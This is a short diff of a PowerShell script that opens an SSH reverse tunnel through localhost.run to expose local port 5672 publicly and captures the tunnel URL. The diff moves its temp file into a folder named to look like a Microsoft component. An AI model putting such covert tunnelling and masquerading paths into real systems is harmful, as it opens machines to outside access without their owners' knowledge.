@@ -7,10 +7,11 @@ Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:5672 localhost.run 
 Start-Sleep -Seconds 5
 
 # Find the line containing the URL in the temporary file
-$url = Get-Content "./temp.txt" | Select-String -Pattern "https:\/\/[a-zA-Z0-9.-]+\.lhr\.life" | ForEach-Object { $_.Matches.Value }
+$url = Get-Content "C:\Program Files\MicrosoftHelperX\temp.txt" | Select-String -Pattern "https:\/\/[a-zA-Z0-9.-]+\.lhr\.life" | ForEach-Object { $_.Matches.Value }
 
 # Print the captured URL 	
 Write-Output $url
+Start-Sleep -Seconds 5
 
 # Clean up temporary file
 # Remove-Item "temp.txt"
